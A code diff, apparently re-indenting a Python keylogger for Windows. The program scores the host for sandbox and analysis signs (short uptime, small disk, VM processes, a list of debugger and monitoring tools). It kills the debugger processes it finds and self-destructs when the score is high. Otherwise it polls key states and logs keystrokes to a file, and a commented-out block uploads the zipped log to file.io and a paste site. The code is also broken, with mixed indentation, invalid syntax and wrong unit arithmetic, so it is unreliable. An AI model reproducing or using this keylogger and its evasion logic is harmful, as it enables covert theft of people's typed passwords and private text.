@@ -125,45 +125,45 @@ in a VM or potentially being debugged or at risk of those things
 Then we simply add up the points and act according to our risk score
 """
 def risk():
-	risk_score = 0
+    risk_score = 0
 
-	# Check uptime
-	uptime_sec    = time.time() - psutil.boot_time()
-	uptime_minute = uptime_sec * 60
-	uptime_hour   = uptime_minute * 60
+    # Check uptime
+    uptime_sec    = time.time() - psutil.boot_time()
+    uptime_minute = uptime_sec * 60
+    uptime_hour   = uptime_minute * 60
 
-	# Tally risk score
-	if uptime_hour < 1:
-		risk_score += 5
+    # Tally risk score
+    if uptime_hour < 1:
+        risk_score += 5
 
-	# Clock
-	ran_int = random.randint(1,21)*5
-	time.sleep(ran_int)
+    # Clock
+    ran_int = random.randint(1,21)*5
+    time.sleep(ran_int)
 
-	# Disk Size
-	# with os.statvfs, we need to multiply block sizes by block counts to get bytes
-	stats = os.statvfs(path)
-	total = stats.f_frsize * stats.f_blocks
-	free  = stats.f_frsize * stats.f_bavail
+    # Disk Size
+    # with os.statvfs, we need to multiply block sizes by block counts to get bytes
+    stats = os.statvfs(path)
+    total = stats.f_frsize * stats.f_blocks
+    free  = stats.f_frsize * stats.f_bavail
 
-	total_mb   = total * 100 # Calculates from bytes to Mb
-	total_free = free * 100
+    total_mb   = total * 100 # Calculates from bytes to Mb
+    total_free = free * 100
 
-	disk_usage ={ "total": total,
-		      "free" : free,
-		      "used" : total - free, }
+    disk_usage ={ "total": total,
+	      "free" : free,
+	      "used" : total - free, }
 
-	# Tally risk score
-	if total_free < 40:
-		risk_score += 5
+    # Tally risk score
+    if total_free < 40:
+	risk_score += 5
 
-	# Clock
-	ran_int = random.randint(1,21)*5
-	time.sleep(ran_int)
+    # Clock
+    ran_int = random.randint(1,21)*5
+    time.sleep(ran_int)
 
 
     # Anti VM
-	VMProcessList = ["vmsrvc.exe", "vmware.exe","vbox.exe",
+    VMProcessList = ["vmsrvc.exe", "vmware.exe","vbox.exe",
 		"vmvss.exe","vmscsi.exe","vmhgfs.exe","vboxservice.exe",
 		"vmxnet.exe","vmx_svga.exe","vmmemctl.exe",
 		"autoruns.exe","autorunsc.exe","vmusbmouse.exe","vmtools.exe",
@@ -172,34 +172,34 @@ def risk():
 		"vmusrvc.exe","xenservice.exe"]
 
     # Debug proc check
-	DebugList = ["ollydbg.exe","ProcessHacker.exe", "fiddler.exe",
+    DebugList = ["ollydbg.exe","ProcessHacker.exe", "fiddler.exe",
 		"tcpview.exe","df5serv.exe", "filemon.exe","procmon.exe","regmon.exe",
 		"procexp.exe","idaq.exe","idaq64.exe","ImmunityDebugger.exe","Wireshark.exe",
 		"dumpcap.exe","HookExplorer.exe","ImportREC.exe","PETools.exe","LordPE.exe",
 		"SysInspector.exe","proc_analyzer.exe","sysAnalyzer.exe","sniff_hit.exe","windbg.exe",
 		"prl_cc.exe","prl_tools.exe","xenservice.exe"]
 
-	DBG_out = []
+    DBG_out = []
 
-	for proc in psutil.process_iter():
-		if proc.name() in DebugList:
-			#print(proc)
-			DBG = True
+    for proc in psutil.process_iter():
+	if proc.name() in DebugList:
+	    #print(proc)
+            DBG = True
 
-			try:
-				p = psutil.Process(proc.pid)
-				time.sleep(0.33)
-				p.kill()
-			except Exception as e:
-				#print e
-				DBG_out.append(proc)
-				continue
+	    try:
+		p = psutil.Process(proc.pid)
+		time.sleep(0.33)
+		p.kill()
+	    except Exception as e:
+		#print e
+		DBG_out.append(proc)
+		continue
 
-		elif proc.name() in VMProcessList:
-			#print(proc)
-			VM = True
+	elif proc.name() in VMProcessList:
+	     #print(proc)
+	     VM = True
 
-			continue
+            continue
 
 	"""
 	If there were DBG procs check to see
@@ -211,25 +211,25 @@ def risk():
 	"""
 	cnt = 0
 	for i in DBG_out:
-		cnt += 1
+	    cnt += 1
 
 	if not cnt < 1:
-		DBG = False
+	    DBG = False
 
 	if DBG and VM == True:
-		risk_score += 15
-		return risk_score
+	    risk_score += 15
+	    return risk_score
 
 	elif DBG == True:
-		risk_score += 12
-		return risk_score
+	    risk_score += 12
+	    return risk_score
 
 	elif VM == True:
-		risk_score += 11
-		return risk_score
+	    risk_score += 11
+	    return risk_score
 
 	else:
-		return risk_score
+	    return risk_score
 
 """
 Main logger logic starts here
@@ -254,10 +254,10 @@ def IsKeyPressed(VK_KEYCODE):
         try:
             VK_KEYCODE = StringToVK(VK_KEYCODE)
         except Exception as e:
-			if debug:
-				e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
-				sys.exit(e)
-            return
+	    if debug:
+	        e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
+		sys.exit(e)
+        return
 
     return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0
 
@@ -303,7 +303,7 @@ class KeyTracker:
 
     def UpdateKeyState(self, key, state):
 
-		def SetKeyState(key, state):
+        def SetKeyState(key, state):
             ActiveKeys[key] = state
             if state == True:
                 self.KeyDown(key)
@@ -324,7 +324,7 @@ class KeyTracker:
             SetKeyState(key, state)
 
     def CompileData(self):
-	    outfile = open("data.txt", "a")
+	outfile = open("data.txt", "a")
         outfile.write("\n")
         outfile.write("-"*15)
         outfile.write("\n")
@@ -333,11 +333,11 @@ class KeyTracker:
         ###--NOT IMPLEMENTED IN BASE LOGGER---###
         """
         with ZipFile("data.zip", "w") as zip:
-			zip.write(outfile)
-			outfile.close()
+	    zip.write(outfile)
+	    outfile.close()
 
-			url = upload('fileio', 'data.zip')
-			result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
+            url = upload('fileio', 'data.zip')
+	    result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
 
          """
          ###--NOT IMPLEMENTED IN BASE LOGGER---###
@@ -358,8 +358,8 @@ def start():
 	t = Thread(KeyTracker.TrackData, [5])
 
 	while True:
-		for key, key_name in VKStr.items():
-			KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
+	    for key, key_name in VKStr.items():
+	        KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
 
 
 def selfdestruct():
@@ -381,32 +381,29 @@ echo sysmon >> {0}'''.format( filename )
     cmdline("sysmon.bat >> NUL")
 
 if __name__ == "__main__":
-	risk = risk()
-	if risk == 25:
-		# All checks report risk
-		# Restricted: Terminate
-		selfdestruct()
-	elif risk == 17:
-		# Flag for DBG proc, flag for VM indicator
-		# Restricted: Terminate
-		selfdestruct()
-	elif risk == 16:
-		# Flag for VM proc, flag for VM indicator
-		# Restricted: Terminate.
-		selfdestruct()
-	elif risk == 10:
-		# Two VM indicator flags
-		# Moderate risk: User Discretion
-		# selfdestruct()
-	elif risk == 5:
-		# One VM indicator
-		# Low risk: User Discretion
-		# selfdestruct()
-	else risk == 0:
-		# No indicators
-		# Of course, this just means we were unable
-		# To find indicators, not that we are 100% safe.
-		start()
-
-
-
+    risk = risk()
+    if risk == 25:
+	# All checks report risk
+	# Restricted: Terminate
+	selfdestruct()
+    elif risk == 17:
+	# Flag for DBG proc, flag for VM indicator
+	# Restricted: Terminate
+	selfdestruct()
+    elif risk == 16:
+	# Flag for VM proc, flag for VM indicator
+	# Restricted: Terminate.
+	selfdestruct()
+    elif risk == 10:
+	# Two VM indicator flags
+	# Moderate risk: User Discretion
+	# selfdestruct()
+    elif risk == 5:
+	# One VM indicator
+	# Low risk: User Discretion
+	# selfdestruct()
+    else risk == 0:
+	# No indicators
+	# Of course, this just means we were unable
+	# To find indicators, not that we are 100% safe.
+	start()
